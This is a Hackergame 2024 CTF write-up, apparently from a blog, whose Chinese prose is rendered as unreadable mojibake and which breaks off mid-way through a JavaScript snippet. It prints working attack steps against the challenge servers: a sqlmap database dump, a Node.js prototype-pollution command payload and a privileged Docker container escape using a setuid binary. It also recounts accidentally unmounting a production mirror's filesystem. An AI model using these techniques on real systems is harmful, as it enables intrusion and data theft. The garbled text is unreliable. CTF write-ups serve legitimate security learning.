## Hackergame2024 WP

è§[blog](https://blog.palve.moe/2024/11/Hackergame2024_writeups/)

### ~~åºŸè¯~~

ä»Šå¹´çš„ Hackergame é¸½äº†ï¼Œæ’ä¸Šäº†å¼ºç½‘ï¼Œ~~è¢«æ‰“çš„æ‰¾ä¸åˆ°åŒ—~~ã€‚æŒ‰ç…§æƒ¯ä¾‹ï¼Œä»Šå¹´ä¹Ÿç®€å•çš„åšä¸€ä¸‹å§

æœ€ç»ˆåæ¬¡ 392/2460 ï¼Œä»¥ä¸‹ wp åŒ…å«äº†å·²åšå‡ºå’Œéƒ¨åˆ†æœ‰æ€è·¯ä½†æ²¡æ—¶é—´ç»§ç»­åšçš„é¢˜ï¼Œæœ€åä¸€æ¬¡ flag æäº¤æ—¶é—´ä¸º 2024-11-03 18:50:45 ï¼Œæ’å 142 

æœ¬æ¥æƒ³ç€~~è£¤è£†é‡Œè¿˜è—äº†6ä¸ªflag~~ï¼Œåœ¨ç»“æŸä¹‹å‰äº¤ä¸Šç‹ ç‹ ä¸Šä¸€æ³¢åˆ†ï¼Œç»“æœç¡è¿‡äº†å¤´ğŸ¤¡

å‡­ä¸ªäººçš„ä¸€å·±ä¹‹åŠ›ï¼ŒæˆåŠŸä¸º hg2024 è´¡çŒ®äº†ä¸¤ä¸ªèŠ±çµ®

å†å¹´å®˜æ–¹é¢˜è§£ï¼š

â€‹	[2023](https://github.com/ustc-hackergame/hackergame2023-writeups)

â€‹	[2022](https://github.com/ustc-hackergame/hackergame2022-writeups)

â€‹	[2021](https://github.com/ustc-hackergame/hackergame2021-writeups)

â€‹	[2020](https://github.com/ustc-hackergame/hackergame2020-writeups)

â€‹	[2019](https://github.com/ustclug/hackergame2019-writeups)

â€‹	[2018](https://github.com/ustclug/hackergame2018-writeups/)

### ç­¾åˆ°

```
/?pass=true
```

ç­¾åˆ°å½“ç„¶æ˜¯ç­¾åˆ°ï¼Œå‚è€ƒå†å¹´çš„åšæ³•ï¼Œå…ˆç–¯ç‹‚ç‚¹å‡»`ç­‰ä¸åŠäº†ï¼Œé©¬ä¸Šå¯åŠ¨!`ç„¶åæ”¹ `false` ä¸º `true` å°±å¯å¾— flag

### å–œæ¬¢åšç­¾åˆ°çš„ CTFer ä½ ä»¬å¥½å‘€

```bash
env
cat .flag
```

å¿«æ¥ä¸€èµ· `sudo` çœ‹å¥¶é¾™ï¼Œæ®è¯´çœ‹å®Œå¥¶é¾™ä¼šå¾—åˆ°flag  ~~æˆ‘æ‰æ˜¯å¥¶é¾™ï¼ˆå¤§é›¾~~

å½“æ—¶å…ˆåšå‡ºæ¥çš„æ˜¯ `Checkin Again & Again` ï¼Œç®€å•ç²—æš´çš„ `ls -alh` å°±çœ‹åˆ°äº†flagã€‚`Checkin Again` å…¶å®æ˜¯å®åœ¨æ‰¾ä¸åˆ°åœ¨å“ªï¼Œé‚çœ‹èµ·äº†ç½‘é¡µæºä»£ç ï¼Œçæ‹–çœ‹åˆ°äº† `NixOS` ï¼Œç‹‚æ‹è„‘è¢‹å°±å¾—åˆ°äº†ç¬¬ä¸€é—®çš„ flagã€‚

### çŒ«å’ªé—®ç­”ï¼ˆHackergame åå‘¨å¹´çºªå¿µç‰ˆï¼‰

#### 1.åœ¨ Hackergame 2015 æ¯”èµ›å¼€å§‹å‰ä¸€å¤©æ™šä¸Šå¼€å±•çš„èµ›å‰è®²åº§æ˜¯åœ¨å“ªä¸ªæ•™å®¤ä¸¾è¡Œçš„ï¼Ÿ

`3A204`

è§https://lug.ustc.edu.cn/wiki/sec/contest.html

#### 2.ä¼—æ‰€å‘¨çŸ¥ï¼ŒHackergame å…±çº¦ 25 é“é¢˜ç›®ã€‚è¿‘äº”å¹´ï¼ˆä¸å«ä»Šå¹´ï¼‰ä¸¾åŠçš„ Hackergame ä¸­ï¼Œé¢˜ç›®æ•°é‡æœ€æ¥è¿‘è¿™ä¸ªæ•°å­—çš„é‚£ä¸€å±Šæ¯”èµ›é‡Œæœ‰å¤šå°‘äººæ³¨å†Œå‚åŠ ï¼Ÿ

`2682`

è§https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/

#### 3.Hackergame 2018 è®©å“ªä¸ªçƒ­é—¨æ£€ç´¢è¯æˆä¸ºäº†ç§‘å¤§å›¾ä¹¦é¦†å½“æœˆçƒ­æœç¬¬ä¸€ï¼Ÿ

`ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»`

è§ [èŠ±çµ®](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)

#### 4.åœ¨ä»Šå¹´çš„ USENIX Security å­¦æœ¯ä¼šè®®ä¸Šä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦å‘è¡¨äº†ä¸€ç¯‡å…³äºç”µå­é‚®ä»¶ä¼ªé€ æ”»å‡»çš„è®ºæ–‡ï¼Œåœ¨è®ºæ–‡ä¸­ä½œè€…æå‡ºäº† 6 ç§æ”»å‡»æ–¹æ³•ï¼Œå¹¶åœ¨å¤šå°‘ä¸ªç”µå­é‚®ä»¶æœåŠ¡æä¾›å•†åŠå®¢æˆ·ç«¯çš„ç»„åˆä¸Šè¿›è¡Œäº†å®éªŒï¼Ÿ

`336`

è§https://www.usenix.org/system/files/usenixsecurity24_slides-ma-jinrui.pdf

#### 5.10 æœˆ 18 æ—¥ Greg Kroah-Hartman å‘ Linux é‚®ä»¶åˆ—è¡¨æäº¤çš„ä¸€ä¸ª patch æŠŠå¤§é‡å¼€å‘è€…ä» MAINTAINERS æ–‡ä»¶ä¸­ç§»é™¤ã€‚è¿™ä¸ª patch è¢«åˆå¹¶è¿› Linux mainline çš„ commit id æ˜¯å¤šå°‘ï¼Ÿ

`6e90b6`

è§https://lore.kernel.org/all/769032f6-2f20-406c-99df-92acd2c1269a@metux.net/

```
This is following the logic of commit
6e90b675cf942e50c70e8394dfb5862975c3b3b2.
```

#### 6.å¤§è¯­è¨€æ¨¡å‹ä¼šæŠŠè¾“å…¥åˆ†è§£ä¸ºä¸€ä¸ªä¸€ä¸ªçš„ token åç»§ç»­è®¡ç®—ï¼Œè¯·é—®è¿™ä¸ªç½‘é¡µçš„ HTML æºä»£ç ä¼šè¢« Meta çš„ Llama 3 70B æ¨¡å‹çš„ tokenizer åˆ†è§£ä¸ºå¤šå°‘ä¸ª tokenï¼Ÿ

`1833`

~~æˆ‘ä¸ä¼šå•Š çˆ†ç ´ä¸€ä¸‹å§~~



### æ‰“ä¸å¼€çš„ç›’

æ‰¾ä¸ªåœ¨çº¿æŸ¥çœ‹çš„ç½‘å€ï¼Œåˆ‡å‰²å³å¯æ‹¿åˆ°flag



### æ¯æ—¥è®ºæ–‡å¤ªå¤šäº†ï¼

ä¸‹è½½PDFåå…¨å±€æœ `flag` ï¼Œä¼šå‘ç°æœ‰ä¸ª `flag here` ï¼Œç¼–è¾‘ PDF ï¼Œç»™é‚£ä¸ªå›¾ç‰‡æŒªå¼€å°±èƒ½çœ‹åˆ° flag



### æ¯”å¤§å°ç‹

~~æˆ‘å¯æ˜¯æ¯”å¤§å°é«˜æ‰‹~~ é€šè¿‡å¯¹é¢˜ç›®è¯·æ±‚çš„æŠ“åŒ…å¯ä»¥å‘ç°ï¼Œæ¯æ¬¡é€‰æ‹©åä¼šæœ‰ 200 æ¯«ç§’ä¸èƒ½æ“ä½œï¼Œå¯ä»¥å°è¯•åŠ«æŒå“åº”åŒ…æ¥è§£è¿™ä¸€é™åˆ¶ã€‚ä½†æ˜¯å½“ä¿®æ”¹å®Œå“åº”åŒ…å†æ¬¡æäº¤ç­”æ¡ˆä¹‹åï¼Œåç«¯ä¼šè¿”å›`æ£€æµ‹åˆ°å¼‚å¸¸æäº¤` å¹¶ä¸”ä¸è¿”å›ä»»ä½•æŠ¥é”™ï¼ˆæŒ å¤´ã€‚

ä¿®æ”¹äº†åç«¯è¿”å›çš„é¢˜ç›®ä¹‹åè¿˜æ˜¯è¿‡ä¸äº† (å¤§æ€’

æœ€ç»ˆä» js å…¥æ‰‹ï¼Œåœ¨ä¿®æ”¹äº†é€‰æ‹©çš„é™åˆ¶ä¹‹åï¼Œåœ¨æ§åˆ¶å°æ‰§è¡Œäº†ä»¥ä¸‹ js ä»£ç åå¾—åˆ° flag

```javascript
function f() {
  if (state.score1 < 100) {
    if (state.value1 < state.value2) {
      chooseAnswer('<');
    } else {
      chooseAnswer('>');
    }
    setTimeout(f, 1);
  }
}

f();

function chooseAnswer(choice) {
  if (!state.allowInput) {
    return;
  }
  state.inputs.push(choice);
  let correct;
  if (state.value1 < state.value2 && choice === '<' || state.value1 > state.value2 && choice === '>') {
    correct = true;
    state.score1++;
    document.getElementById('answer').style.backgroundColor = '#5e5';
  } else {
    correct = false;
    document.getElementById('answer').style.backgroundColor = '#e55';
  }
  document.getElementById('answer').textContent = choice;
  document.getElementById('score1').textContent = state.score1;
  document.getElementById('progress1').style.width = `${state.score1}%`;
  state.allowInput = false;
  setTimeout(() => {
    if (state.score1 === 100) {
      submit(state.inputs);
    } else if (correct) {
      state.value1 = state.values[state.score1][0];
      state.value2 = state.values[state.score1][1];
      state.allowInput = true;
      document.getElementById('value1').textContent = state.value1;
      document.getElementById('value2').textContent = state.value2;
      document.getElementById('answer').textContent = '?';
      document.getElementById('answer').style.backgroundColor = '#fff';
    } else {
      state.allowInput = false;
      state.stopUpdate = true;
      document.getElementById('dialog').textContent = 'ä½ é€‰é”™äº†ï¼ŒæŒ‘æˆ˜å¤±è´¥ï¼';
      document.getElementById('dialog').style.display = 'flex';
    }
  }, 1);  // 200 æ”¹æˆ 1
}
```



### æ—…è¡Œç…§ç‰‡ 4.0

ç¬¬ä¸€é—®

ç™¾åº¦åœ°å›¾ç›´æ¥æœ `ç§‘é‡Œç§‘æ°”ç§‘åˆ›é©¿ç«™ ï¼ˆç§‘å¤§ç«™ï¼‰` å³å¯æ‰¾åˆ°æ­£ç¡®ä½ç½®ï¼Œè·ç¦» ã€Œ**ä¸œæ ¡åŒºè¥¿é—¨**ã€æ›´è¿‘

ç¬¬äºŒé—®

ç›´æ¥æœ **USTC** ã€**LEO**ã€**ä¸­ç§‘å¤§** ï¼Œæ‰¾åˆ°å¯¹åº”çš„ [Bilibili è´¦æˆ·](https://space.bilibili.com/7021308/)ï¼Œç„¶åç¿»çœ‹å¯¹åº”çš„ [å¸–å­](https://www.bilibili.com/opus/930934582351495204)

ç¬¬ä¸‰é—®

è§‚å¯Ÿåˆ°å³è¾¹é»‘è‰²åƒåœ¾æ¡¶ä¸Šæœ‰ `å…­å®‰` äºŒå­—ï¼Œéå†æ‰€æœ‰å’Œè¯¥åŸå¸‚æœ‰å…³çš„å…¬å›­å°±è¡Œ

ç¬¬å››é—®

çŸ³å¤´æ˜¯æˆªæµçŸ³ï¼Œç„¶åGoogleä¸€ä¸‹å›¾ç‰‡ä¼šå‘ç°æœ‰ä¸ªæºç¨‹çš„ç½‘é¡µä¸Šå†™äº†`å›å­å²­`

ç¬¬äº”é—®å’Œç¬¬å…­é—®

å…ˆæœ `å››ç¼–ç»„åŠ¨è½¦` ï¼Œç„¶åå†æœç½‘é¡µé‡Œæåˆ°çš„ `CRH6` ï¼Œç¿»åˆ° [Wikipedia]([https://zh.wikipedia.org/wiki/%E5%92%8C%E8%B0%90%E5%8F%B7CRH6%E5%9E%8B%E7%94%B5%E5%8A%9B%E5%8A%A8%E8%BD%A6%E7%BB%84](https://zh.wikipedia.org/wiki/å’Œè°å·CRH6å‹ç”µåŠ›åŠ¨è½¦ç»„)) åå¯ä»¥çœ‹åˆ°ä¸€è¾†æ ‡æœ‰`æ€€å¯†çº¿` çš„çº¢è‰²åˆ—è½¦ï¼Œä¸é¢˜ç›®æ¯”è¾ƒç›¸ç¬¦ï¼Œé¡ºæ‰‹æœç´¢å¯¹åº”çº¿è·¯ï¼Œæ‰¾åˆ° **åŒ—äº¬åŒ—åŠ¨è½¦è¿ç”¨æ‰€** ï¼Œæ—è¾¹å°±æ˜¯ **ç§¯æ°´æ½­åŒ»é™¢** ã€‚



### PaoluGPT ~~è·‘è·¯GPT~~

#### åƒé‡ŒæŒ‘ä¸€

~~ä¼—æ‰€å‘¨çŸ¥ï¼Œ~~è¿™ä¹ˆå¤š chat history é‡Œæ‰¾é‚£ä¸ª flag ä¸ç°å®ï¼Œé‚£å°±ç®€å•ç²—æš´çš„ç»™æ‰€æœ‰é¡µé¢çˆ¬ä¸‹æ¥æœflag

```python
import requests
from bs4 import BeautifulSoup

base_url = "https://chal01-b3z64rsh.hack-challenge.lug.ustc.edu.cn:8443"

headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Cookie": "changeme",
    "Host": "chal01-b3z64rsh.hack-challenge.lug.ustc.edu.cn:8443",
    "Pragma": "no-cache",
    "Referer": "https://chal01-b3z64rsh.hack-challenge.lug.ustc.edu.cn:8443/list",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"'
}

response = requests.get(base_url + "/list", headers=headers)
if response.status_code != 200:
    print(f"è®¿é—®å¤±è´¥çŠ¶æ€ç : {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")

view_links = []
for link in soup.find_all("a"):
    href = link.get("href")
    if href and "view?conversation_id=" in href:
        view_links.append(href)

with open("output.txt", "w", encoding="utf-8") as output_file:
    for link in view_links:
        response = requests.get(base_url + link, headers=headers)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            content = soup.get_text(separator="\n").strip()
            output_file.write(content + "\n\n")
            print(f"æˆåŠŸè®¿é—®: {link}")
        else:
            print(f"è®¿é—®å¤±è´¥: {link}ï¼ŒçŠ¶æ€ç : {response.status_code}")

print("saved to output.txt")

```

![image-20241103113028472](image-20241103113028472.png)

ä¸ºä»€ä¹ˆä¸æ˜¯114154è¡Œ ï¼ˆğŸ˜¡

####  çª¥è§†æœªçŸ¥

å½“æ—¶æŒ ç ´è„‘è¢‹éƒ½æ²¡æƒ³åˆ°æœªçŸ¥åˆ°åº•æœªçŸ¥åˆ°å“ªäº†ï¼Œçœ‹å®Œé™„ä»¶ä¹‹åæç„¶~~å¤§é›¾~~ ï¼ˆç¡®è¯Šä¸ºæœªä¸ºæ³¨æ„åŠ›ä¸é›†ä¸­å¯¼è‡´çš„

**attention is all you need!**

`sqlmap --cookie dump` ä¸€æŠŠå—¦

```bash
sqlmap -u "https://chal01-yh8m6qof.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=3e82ebb0-cc9e-4f12-b76c-d35c0d979bf5" --cookie "changeme" --dbms=sqlite --dump | grep 'flag'
```

æ‹–å‡ºæ¥ä¹‹åæœflagå³å¯å¾—åˆ°è—ç€çš„flag

å¯¹åº”çš„æ–‡ç« çš„uuidåº”è¯¥æ˜¯`24052425-8f7e-4e97-bdc5-b10f13d9538d` `è¯·è¯¦ç»†è§£é‡Šä»¥ä¸‹åè¯ï¼š æ°´äº§å…»æ®–ä¸šä¸­çš„ç°çŠ¶`

![image-20241103115531851](image-20241103115531851.png)

### Node.js is Web Scaleï¼ˆè—è£¤è£†çš„flag

è¿™ä¸ªé¢˜è€ƒçš„æ˜¯ **Node.js åŸå‹é“¾æ±¡æŸ“** ï¼Œé˜…è¯»é¢˜ç›®æºç åï¼Œè®¾ç½®keyä¸º `__proto__.cmd` ï¼Œvalueæ˜¯`cat flag`

è®¿é—® `/execute?cmd=cmd` å°±èƒ½å¾—åˆ° flag



### å¼ºå¤§çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆè—è£¤è£†çš„flag

ç¬¬ä¸€é—®

é˜…è¯»æºç åçŸ¥é“éœ€è¦å®ç°16çš„å–æ¨¡ï¼Œèƒ½å¦è¢«16æ•´é™¤åªéœ€è¦çœ‹å4ä½ï¼Œåªéœ€è¦~~æš´åŠ›åŒ¹é…~~åå››ä½å³å¯å¾—åˆ° flag ï¼Œè§ä»¥ä¸‹å€ŸåŠ©GPTå¾—åˆ°çš„é€†å¤©è¡¨è¾¾å¼

```
(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984|1000))
```



### æƒœå­—å¦‚é‡‘3.0

#### é¢˜ç›®A

æœ€ç®€å•äº†ï¼Œå¡«ç©ºé¢˜

``` python
#!/usr/bin/python3                                                              
                                                                                
import atexit, base64, flask, itertools, os, re                                 
                                                                                
                                                                                
def crc(input: bytes) -> int:                                                   
    poly, poly_degree = 'AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA', 48 
    assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == 'A' 
    flip = sum(['a', 'A'].index(poly[i + 1]) << i for i in range(poly_degree))  
    digest = (1 << poly_degree) - 1                                             
    for b in input:                                                             
        digest = digest ^ b                                                     
        for _ in range(8):                                                      
            digest = (digest >> 1) ^ (flip if digest & 1 == 1 else 0)           
    return digest ^ (1 << poly_degree) - 1                                      
                                                                                
                                                                                
def hash(input: bytes) -> bytes:                                                
    digest = crc(input)                                                         
    u2, u1, u0 = 0xCb4EcdfD0A9F, 0xa9dec1C1b7A3, 0x60c4B0aAB4Bf                 
    assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919)  
    digest = (digest * (digest * u2 + u1) + u0) % (1 << 48)                     
    return digest.to_bytes(48 // 8, 'little')                                   
                                                                                
                                                                                
def xzrj(input: bytes) -> bytes:                                                
    pat, repl = rb'([B-DF-HJ-NP-TV-Z])\1*(E(?![A-Z]))?', rb'\1'                 
    return re.sub(pat, repl, input, flags=re.IGNORECASE)                        
                                                                                
                                                                                
paths: list[bytes] = []                                                         
                                                                                
xzrj_bytes: bytes = bytes()                                                     
                                                                                
with open(__file__, 'rb') as f:                                                 
    for row in f.read().splitlines():                                           
        row = (row.rstrip() + b' ' * 80)[:80]                                   
        path = base64.b85encode(hash(row)) + b'.txt'                            
        with open(path, 'wb') as pf:                                            
            pf.write(row)                                                       
            paths.append(path)                                                  
            xzrj_bytes += xzrj(row) + b'\r\n'                                   
                                                                                
    def clean():                                                                
        for path in paths:                                                      
            try:                                                                
                os.remove(path)                                                 
            except FileNotFoundError:                                           
                pass                                                            
                                                                                
    atexit.register(clean)                                                      
                                                                                
                                                                                
bp: flask.Blueprint = flask.Blueprint('answer_a', __name__)                     
                                                                                
                                                                                
@bp.get('/answer_a.py')                                                         
def get() -> flask.Response:                                                    
    return flask.Response(xzrj_bytes, content_type='text/plain; charset=UTF-8') 
                                                                                
                                                                                
@bp.post('/answer_a.py')                                                        
def post() -> flask.Response:                                                   
    wrong_hints = {}                                                            
    req_lines = flask.request.get_data().splitlines()                           
    iter = enumerate(itertools.zip_longest(paths, req_lines), start=1)          
    for index, (path, req_row) in iter:                                         
        if path is None:                                                        
            wrong_hints[index] = 'Too many lines for request data'              
            break                                                               
        if req_row is None:                                                     
            wrong_hints[index] = 'Too few lines for request data'               
            continue                                                            
        req_row_hash = hash(req_row)                                            
        req_row_path = base64.b85encode(req_row_hash) + b'.txt'                 
        if not os.path.exists(req_row_path):                                    
            wrong_hints[index] = f'Unmatched hash ({req_row_hash.hex()})'       
            continue                                                            
        with open(req_row_path, 'rb') as pf:                                    
            row = pf.read()                                                     
            if len(req_row) != len(row):                                        
                wrong_hints[index] = f'Unmatched length ({len(req_row)})'       
                continue                                                        
            unmatched = [req_b for b, req_b in zip(row, req_row) if b != req_b] 
            if unmatched:                                                       
                wrong_hints[index] = f'Unmatched data (0x{unmatched[-1]:02X})'  
                continue                                                        
            if path != req_row_path:                                            
                wrong_hints[index] = f'Matched but in other lines'              
                continue                                                        
    if wrong_hints:                                                             
        return {'wrong_hints': wrong_hints}, 400                                
    with open('answer_a.txt', 'rb') as af:                                      
        answer_flag = base64.b85decode(af.read()).decode()                      
        closing, opening = answer_flag[-1:], answer_flag[:5]                    
        assert closing == '}' and opening == 'flag{'                            
        return {'answer_flag': answer_flag}, 200                                
```



### ä¼˜é›…çš„ä¸ç­‰å¼ï¼ˆè—è£¤è£†çš„flag

#### Easy

å·æ‡’é—® AI ç›´æ¥å¾—åˆ°è¡¨è¾¾å¼ `4*((1-x**2)**(1/2)-(1-x**2))`



### æ— æ³•è·å¾—çš„ç§˜å¯† ï¼ˆè—è£¤è£†çš„flag

ä¹‹å‰åœ¨ç½‘ä¸Šå†²æµªçœ‹åˆ°è¿‡ä¸€ä¸ªç”¨äºŒç»´ç æ¥ä¼ è¾“æ•°æ®çš„å¸–å­ï¼Œæ°å¥½å¯ä»¥ç”¨åœ¨è¿™é“é¢˜ä¸Š

åœ¨ Github ä¸Šæœ repo `qrtransfer`

ç„¶åæ‰‹æœºå¯¹ç€æ‰«ç å°±èƒ½å¾—åˆ°ç§˜å¯†



### ZFS ï¼ˆè—è£¤è£†çš„flagã€èŠ±çµ®

ä½œä¸º zfs ~~èµ„æ·±ç©å®¶~~ï¼Œé‚£ä¹ˆæ¢å¤å‡ ä¸ªæ–‡ä»¶è‚¯å®šæ˜¯ç»°ç»°æœ‰ä½™ï¼Œå…ˆç»™å¯¹åº”çš„é•œåƒæ‹–ä¸‹æ¥æŒ‚è½½åˆ° mirrorsä¸Šï¼ˆæ•²é‡ç‚¹ï¼Œ~~åè¾¹è¦è€ƒ~~ï¼‰ã€‚æ‹¿åˆ°å¯¹åº”çš„ pool ä¹‹åå…ˆæŸ¥çœ‹å¯¹åº”çš„å¿«ç…§ `zfs list -t snapshot` ï¼Œæ¢å¤å…¶ä¸­çš„å¿«ç…§ä¹‹åè¿˜æ˜¯æ²¡çœ‹åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼ˆæŒ å¤´

æ—¢ç„¶æ˜¯ zfs ï¼Œè‚¯å®šå¯ä»¥ `zfs send` ï¼Œé»˜è®¤æƒ…å†µä¸‹æ˜¯æ˜æ–‡å‘é€çš„ï¼Œé‚£ä¹ˆæ‰‹æ“ä¸€ä¸ªstream æ–‡ä»¶ç›´æ¥ grep å°±èƒ½å¾—åˆ°flag

ç¬¬äºŒé—®æˆ‘ç”¨ `testdisk` æ¢å¤å‡ºæ¥ä¸€ä¸ª shell script (f0008452.sh)ï¼Œä¸ä¼šåšï¼Œæ”¾å¼ƒ ï¼ˆæˆ‘æ€ä¹ˆæ²¡ç”¨æƒ³åˆ°ç”¨zdbå•Š æ‚²ï¼‰

```bash
#!/bin/sh
flag_key="hg2024_$(stat -c %X.%Y flag1.txt)_$(stat -c %X.%Y "$0")_zfs"
echo "46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508  -" > /tmp/sha256sum.txt
printf "%s" "$flag_key" | sha256sum --check /tmp/sha256sum.txt || exit 1
printf "flag{snapshot_%s}\n" "$(printf "%s" "$flag_key" | sha1sum | head -c 32)"
```

åœ¨åšå®Œè¿™é“é¢˜ä¹‹åï¼Œ**ä¸‹æ„è¯†**çš„æ‰§è¡Œäº†ä»¥ä¸‹å‘½ä»¤ï¼Œè¿›ä¸€æ­¥å¯¼è‡´mirrorsä½“é¢

```bash
sudo zfs unmount -a
```

å…¶å®æ‰§è¡Œä¹‹åå‘ç°æœ‰ä¸€æ®µæ—¶é—´çš„å¡é¡¿ï¼Œé‚ç«‹å³ `CTRL+C` åœæ­¢ï¼Œå¹¸è¿çš„æ˜¯ï¼Œhg2024 è¢«æˆåŠŸ unmount äº†ï¼Œä¸å¹¸çš„æ˜¯ï¼Œubuntu è¿™ä¸ª repo ä¹Ÿè¢« unmount æ‰äº†ï¼Œå…¶ä»– repo æš‚æ—¶ä¸å—å½±å“ã€‚è‡³æ­¤ï¼Œå½“äº‹äººå¹¶æœªå‘ç°ä»»ä½•å¼‚å¸¸ï¼Œä¹Ÿæ²¡æœ‰æ£€æŸ¥åŸæœ‰çš„ dataset çš„æŒ‚è½½çŠ¶æ€ä¾¿ç™»å‡ºäº†æœåŠ¡å™¨ï¼Œç›´åˆ°...... é‚®ä»¶ä¸€è®°[é‡é”¤](https://github.com/NYIST-CIPS/issues/issues/11)ç‹ ç‹ æ•²åœ¨å½“äº‹äººè„‘é—¨ã€‚

è§ä»¥ä¸‹èŠå¤©è®°å½•	**hg å¦‚ä½•è®©å‡ ç™¾å…¬é‡Œå¤–çš„é•œåƒç«™ä½“é¢**

```
Palve, [2024/11/2 21:41]
è‰

Palve, [2024/11/2 21:41]
æˆ‘uuuçš„æºå‘¢

Î¾ | Ver 1, [2024/11/2 21:41]
ğŸ¤£ğŸ¤£ğŸ¤£

Harry, [2024/11/2 21:42]
æŒ‚ä¸Šäº†å—ï¼Ÿ

Palve, [2024/11/2 21:43]
å¥½äº†

Palve, [2024/11/2 21:43]
ä¸ºä»€ä¹ˆä¼šæ‰mount point

Haruhi, [2024/11/2 21:44]
å› ä¸ºä½ åœ¨è€çš„inodeä¸Šé¢

Palve, [2024/11/2 21:46]
ç ´æ¡ˆäº†

Palve, [2024/11/2 21:47]
é‚£ä¼šåš hackergame çš„æ—¶å€™å¸è½½ hg2024 è¿™ä¸ª pool æ—¶é”™è¯¯çš„ä¸‹æ„è¯†æ‰§è¡Œäº† sudo zfs unmount -a

Keyu Tao, [2024/11/2 21:48]
ä¸æ˜¯ï¼Œä½ ç”¨ mirrors æœåŠ¡å™¨åš hg é¢˜ç›®å—

Î¾ | Ver 1, [2024/11/2 21:49]
æ€ä¹ˆå¤§å®¶éƒ½è¿™ä¹ˆåäºº

Palve, [2024/11/2 21:49]
åŒ…çš„ï¼ˆ

Palve, [2024/11/2 21:50]
æ‰‹å¤´æœ‰zfsæ¨¡å—çš„å°±å‰©mirrorsäº†

Haruhi, [2024/11/2 21:50]
ä¸æ˜¯ï¼Œä½ ç”¨ mirrors æœåŠ¡å™¨åš hg é¢˜ç›®å—

Palve, [2024/11/2 21:50]
æˆ‘è¿˜ç”¨mirrorsçš„æœºå™¨ç¼–è¯‘kernel

Palve, [2024/11/2 21:50]
è¿˜æœ‰å…¶ä»–å¦™å¦™äºŒè¿›åˆ¶

ğ–ğ•­ğ–šğ–Œ ğŸŒ, [2024/11/2 21:50]
ç¼–è¯‘ä¸œè¥¿è¿˜å¥½å§

ğ–ğ•­ğ–šğ–Œ ğŸŒ, [2024/11/2 21:51]
ä½ æ‹¿è¿™ä¸ª zfs ç›´æ¥åšé¢˜ï¼Œè¿˜ umount -aã€‚ã€‚ã€‚

ğ–ğ•­ğ–šğ–Œ ğŸŒ, [2024/11/2 21:51]
è‰ºé«˜äººèƒ†å¤§ï¼Œä½†æ˜¯å°±æ€•ä¸€ä¸å°å¿ƒå°±ç¿»è½¦äº†

Palve, [2024/11/2 21:51]
æˆ‘å½“æ—¶æ‰§è¡Œå®Œä¹‹åå°± CTRL+C äº†

Palve, [2024/11/2 21:52]
æœ€ç»ˆåªæœ‰è¿™ä¸€ä¸ª repo è¢«æˆåŠŸ unmount

ğ–ğ•­ğ–šğ–Œ ğŸŒ, [2024/11/2 21:53]
ã€Šhg å¦‚ä½•è®©å‡ ç™¾å…¬é‡Œå¤–çš„é•œåƒç«™ä½“é¢ã€‹


```



### Docker for Everyone Plus  ï¼ˆè—è£¤è£†çš„flag

ç¬¬ä¸€é—®ç®€å•ï¼ŒWindows ç”¨æˆ·åªéœ€è¦ä¸€ä¸ª xshell å³å¯è§£å†³ä½¿ç”¨ ZMODEM ä¼ è¾“æ–‡ä»¶çš„é—®é¢˜

å…¶å®æœ€ä¸»è¦çš„è¿˜æ˜¯è¦è¿›åˆ° /tmp æˆ– tmpfsä¸‹ï¼Œä¸ç„¶ä¼šä¼ ä¸ä¸Šå»

å…ˆåœ¨æœ¬åœ°æ‰‹åŠ¨æ„å»ºä¸€ä¸ªé•œåƒ

```dockerfile
FROM docker.io/library/alpine:latest

RUN apk add su-exec && chmod +s /sbin/su-exec
```

æœ¬åœ°å¯¼å‡ºåä¸Šä¼ åˆ°ç¯å¢ƒä¸­ï¼Œ ä½¿ç”¨ `sudo docker image load` å¯¼å…¥ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯å¾—åˆ° flag

```shell
docker run --rm -u 1000:1000 -it --privileged -v /:/mnt:ro alpine  
exec su-exec root /bin/ash
cat /mnt/flag
```

### é›¶çŸ¥è¯†æ•°ç‹¬

åªä¼šä¸ªç¬¬ä¸€é—®ï¼Œç®€å•ç²—æš´çš„ä¿®æ”¹å“åº”åŒ…ç„¶åå°±èƒ½æ‹¿åˆ° é¦™é¦™è½¯è½¯çš„ flag

```
'use strict';
(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [83],
  {
    5019: (e, i) => {
